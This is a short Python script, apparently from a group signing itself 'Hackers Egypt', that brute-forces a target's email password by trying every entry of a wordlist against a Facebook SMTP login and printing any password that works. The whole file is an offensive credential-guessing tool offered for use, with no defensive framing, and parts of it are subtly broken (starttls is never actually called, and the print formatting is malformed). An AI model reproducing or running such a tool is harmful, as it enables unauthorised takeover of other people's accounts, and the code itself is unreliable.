import smtplib
from termcolor import *
#Hackers Egypt
smtpserver = smtplib.SMTP("smtpout.mx.facebook.com",554)
smtpserver.ehlo()
smtpserver.starttls

user = raw_input ("enter target email:")
passwfile = raw_input ("enter password list path:")
passwfile = open(passwfile,"r")

for password in  passwfile:
            try:
                 smtpserver.login(user,password)
                 print ("[+] password found =====>%s") %password
                 break;
            except smtplib.SMTPAuthenticationError:
                 print ("[+] password not found =====>%s") %password
